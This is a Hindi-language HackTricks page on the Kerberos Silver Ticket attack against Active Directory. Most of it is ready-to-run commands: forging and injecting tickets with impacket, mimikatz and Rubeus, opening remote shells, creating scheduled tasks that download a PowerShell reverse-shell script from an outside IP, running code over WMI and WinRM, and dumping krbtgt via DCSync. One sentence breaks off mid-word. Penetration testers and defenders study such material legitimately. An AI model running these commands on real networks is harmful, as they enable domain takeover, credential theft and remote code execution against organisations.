# सिल्वर टिकट

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **मुझे** **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें** द्वारा PRs सबमिट करके [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

यदि आप **हैकिंग करियर** में रुचि रखते हैं और अहैकेबल को हैक करना चाहते हैं - **हम भर्ती कर रहे हैं!** (_फ्लूएंट पोलिश लिखित और बोली जानी चाहिए_).

{% embed url="https://www.stmcyber.com/careers" %}

## सिल्वर टिकट

**सिल्वर टिकट** हमला Active Directory (AD) वातावरण में सेवा टिकट का शोषण शामिल करता है। इस विधि पर **किसी सेवा खाते** के NTLM हैश को प्राप्त करने पर निर्भर है, जैसे कि कंप्यूटर खाता, ताकि टिकट ग्रांटिंग सेवा (TGS) टिकट को झूठा बनाया जा सके। इस झूठे टिकट के साथ, एक हमलावर नेटवर्क पर विशेष सेवाओं तक पहुंच सकता है, **किसी भी उपयोगकर्ता का अनुकरण** करते हुए, आम तौर पर प्रशासनिक अधिकारों का लक्ष्य रखते हुए। यह जोर दिया जाता है कि टिकट बनाने के लिए AES कुंजियों का उपयोग करना अधिक सुरक्षित और कम पकड़ने वाला है।

टिकट निर्माण के लिए, विभिन्न उपकरण ऑपरेटिंग सिस्टम पर आधारित हैं:

### लिनक्स पर
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Windows पर
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
## उपलब्ध सेवाएं

| सेवा प्रकार                               | सेवा सिल्वर टिकट                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>ओएस के आधार पर भी:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>कुछ मौकों पर आप सीधे पूछ सकते हैं: WINRM</p> |
| निर्धारित कार्य                            | HOST                                                                       |
| Windows फ़ाइल साझा, भी psexec            | CIFS                                                                       |
| LDAP कार्यों, समेत DCSync           | LDAP                                                                       |
| Windows रिमोट सर्वर प्रशासन उपकरण | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

**Rubeus** का उपयोग करके आप इन सभी टिकट के लिए पूछ सकते हैं इस पैरामीटर का उपयोग करके:

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### सिल्वर टिकट्स इवेंट आईडी

* 4624: खाता लॉगऑन
* 4634: खाता लॉगऑफ
* 4672: व्यवस्थापक लॉगऑन

## सेवा टिकट का दुरुपयोग

निम्नलिखित उदाहरणों में यह सोचा जाता है कि टिकट प्रशासक खाता का अनुकरण करके प्राप्त किया गया है।

### CIFS

इस टिकट के साथ आप `SMB` के माध्यम से `C$` और `ADMIN$` फ़ोल्डर तक पहुँच सकेंगे (यदि वे उजागर हैं) और दूरस्थ फ़ाइल सिस्टम के किसी हिस्से में फ़ाइलें कॉपी कर सकेंगे बस कुछ इस प्रकार:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
### होस्ट

इस अनुमति के साथ आप दूरस्थ कंप्यूटर में निर्धारित कार्यों को उत्पन्न कर सकते हैं और विचारशील आदेशों को निष्पादित कर सकते हैं:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### होस्ट + RPCSS

इन टिकट्स के साथ आप **पीड़ित सिस्टम में WMI का निष्पादन कर सकते हैं**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
### होस्ट + WSMAN (WINRM)

एक कंप्यूटर पर winrm एक्सेस के साथ आप **इसे एक्स
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
### LDAP

इस विशेषाधिकार के साथ आप **DCSync** का उपयोग करके DC डेटाबेस को डंप कर सकते हैं:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**DCSync** के बारे में अधिक जानकारी प्राप्त करें:

## संदर्भ
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

यदि आप **हैकिंग करियर** में रुचि रखते हैं और अहैकेबल को हैक करना चाहते हैं - **हम नियुक्ति कर रहे हैं!** (_फ्लूएंट पोलिश लिखने और बोलने की आवश्यकता है_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>जीरो से हीरो तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी कंपनी का **विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स देखें**](https://github.com/sponsors/carlospolop)!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **जुड़ें** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या **मुझे** ट्विटर पर **फॉलो** करें 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **हैकिंग ट्रिक्स साझा करें** द्वारा PRs सबमिट करके [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>
